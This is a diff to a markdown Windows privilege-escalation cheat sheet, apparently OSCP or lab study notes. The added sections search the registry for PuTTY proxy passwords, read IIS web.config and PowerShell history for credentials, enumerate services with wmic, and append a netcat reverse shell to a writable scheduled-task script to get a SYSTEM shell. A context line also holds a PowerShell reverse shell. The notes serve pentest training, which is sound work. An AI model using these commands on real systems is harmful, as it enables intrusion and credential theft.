@@ -174,6 +174,14 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s      :: saved PuTTY sess
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s   :: SNMP community strings
 ```
 
+**PuTTY proxy credentials** — PuTTY won't store the SSH password itself, but it does store proxy configuration, which can include a cleartext `ProxyPassword`. Search specifically for it:
+
+```shell-session
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+> 💡 "SimonTatham" is the creator of PuTTY and part of the fixed registry path — not a username. The stored proxy username is visible in the same output. The same principle applies broadly: any software that saves credentials (browsers, email clients, FTP/SSH/VNC clients) has some local storage mechanism worth hunting down — PuTTY is just the most commonly forgotten one.
+
 ### 1.4 Config Files, Scripts & Application Data
 
 ```cmd
@@ -181,7 +189,18 @@ findstr /si password *.xml *.ini *.txt *.config 2>nul
 findstr /spin "password" *.*                                 :: recursive search from current dir
 
 dir /s /b *pass* *cred* *vnc* *.config
-type C:\inetpub\wwwroot\web.config                            :: IIS connection strings
+```
+
+**IIS `web.config`** — IIS is Windows' default web server, and its site config routinely stores database connection strings and configured-auth credentials. Depending on the installed IIS version, check both locations:
+
+```
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+```
+
+```shell-session
+type C:\inetpub\wwwroot\web.config
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
 ```powershell
@@ -195,6 +214,11 @@ Get-ChildItem -Path C:\ -Include *.xml,*.ini,*.txt,*.config -File -Recurse -Erro
 ```powershell
 (Get-PSReadlineOption).HistorySavePath
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+```shell-session
+:: cmd.exe equivalent (no PowerShell needed)
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 > ⚠️ People paste credentials into PowerShell sessions constantly — this file is often the single fastest win on a box.
@@ -237,6 +261,21 @@ accesschk.exe /accepteula -uwcqv <username> *
 sc qc <servicename>              :: query service config (binary path, start type, account)
 sc query state= all              :: enumerate all services
 ```
+
+**`wmic service` — listing services in detail (all variants):**
+
+```cmd
+wmic service list brief                                        :: quick overview: name, state, start mode
+wmic service list full                                          :: every field wmic has on every service
+wmic service list config                                        :: config-focused: path, start mode, service account
+wmic service get name                                            :: just service names
+wmic service get name,state,startmode                            :: name + running state + start type
+wmic service get name,displayname,pathname,startname             :: name, display name, binary path, run-as account
+wmic service get name,pathname,startname,state | findstr /i "auto"   :: auto-start services only — best privesc targets
+wmic service where startname="LocalSystem" get name,pathname     :: services running as SYSTEM specifically
+```
+
+> 💡 `startname="LocalSystem"` is the highest-value filter — cross-reference its output against writable binpaths (`icacls`) and unquoted paths (below) to shortlist exploitable services fast, instead of manually reading `list full` for every entry.
 
 **If you have `SERVICE_CHANGE_CONFIG` on a service running as SYSTEM:**
 ```cmd
@@ -343,7 +382,40 @@ mimikatz # sekurlsa::logonpasswords
 schtasks /query /fo LIST /v
 ```
 
+`/fo LIST /v` dumps every task in full detail, which is a lot of noise. Once something interesting catches your eye in that output (or in winPEAS), pull just that task by name with `/tn` to see exactly what it runs and as whom:
+
+```cmd
+schtasks /query /tn vulntask /fo list /v
+```
+
+Look at the `Task To Run` field for the executable/script path (check if it's writable — see [2.3](#23-weak-folderfile-permissions-on-service-binaries)) and `Run As User` to confirm it executes as SYSTEM or an admin account. Also check `Schedule Type`/`Start Time` if you plan to catch execution live with Process Monitor or pspy-equivalent tooling.
+
 Look for tasks that run as SYSTEM/admin and either (a) execute a script/binary you can write to, or (b) run on a predictable interval you can catch with Process Monitor.
+
+**Exploitation — writable `.bat` target with a netcat reverse shell:**
+
+If `Task To Run` points to a `.bat`/`.ps1` script and `icacls` shows you have write access to it, append a reverse shell one-liner rather than replacing the whole file (keeps the original functionality intact and avoids breaking whatever legitimate job depends on it):
+
+```cmd
+icacls C:\path\to\vulntask.bat
+```
+
+```shell-session
+echo C:\PentestTools\nc64.exe -e cmd.exe [YOUR_IP] 4444 >> C:\path\to\vulntask.bat
+```
+
+```bash
+# Attacker box — start the listener before the task fires
+nc -lvnp 4444
+```
+
+Then either wait for the scheduled trigger, or force it immediately if you have the rights:
+
+```cmd
+schtasks /run /tn vulntask
+```
+
+The task executes as whatever account is set in `Run As User` — if that's SYSTEM, the shell that lands on your listener is SYSTEM.
 
 ### 2.8 AutoRuns & Startup Applications
 
@@ -452,7 +524,7 @@ smbserver.py share $(pwd) -smb2support
 
 ```cmd
 whoami                                          :: verify SYSTEM/administrator
-type C:\Users\Administrator\Desktop\flag.txt    :: grab the flag
+type C:\Users\<username>\Desktop\flag.txt       :: grab the flag
 ```
 
 ```cmd
@@ -568,7 +640,7 @@ powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('[YOUR_IP]',4444);$s=$c.
 | TryHackMe: Windows Privilege Escalation | https://tryhackme.com/room/windowsprivesc20 |
 | PayloadsAllTheThings: Windows PrivEsc | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md |
 | HackTricks: Windows Local Privilege Escalation | https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html |
-| Conda: OSCP Methodology | https://www.youtube.com/watch?v=Qfy-traJwIs |
+| Conda: OSCP Methodology | https://www.youtube.com/watch?v=VpNaPAh93vE |
 
 ---
 
